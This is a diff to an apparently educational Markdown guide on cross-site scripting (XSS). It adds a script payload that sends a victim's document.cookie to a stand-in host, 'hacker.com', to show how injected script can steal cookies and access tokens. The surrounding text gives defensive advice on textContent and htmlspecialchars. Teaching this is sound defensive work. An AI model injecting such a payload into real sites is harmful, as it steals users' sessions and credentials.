@@ -72,6 +72,13 @@ XSS is an injection attack. If you have some type of form, that uploads data and
 window.alert("Hello i am inserted")
 </script>
 ```
+To see how dangerous XSS is, lool at that:
+```
+<script>
+window.location = "http://hacker.com/hack.php?cookie=" + escape(document.cookie)
+</script>
+```
+See, you can steal cookies: which can have eccess tokens.
 
 When insert text with javascript use instead of innerHTML, textContent. When echo in php fetch the echo content out of htmlspecialchars($_POST["body"]).
 ```
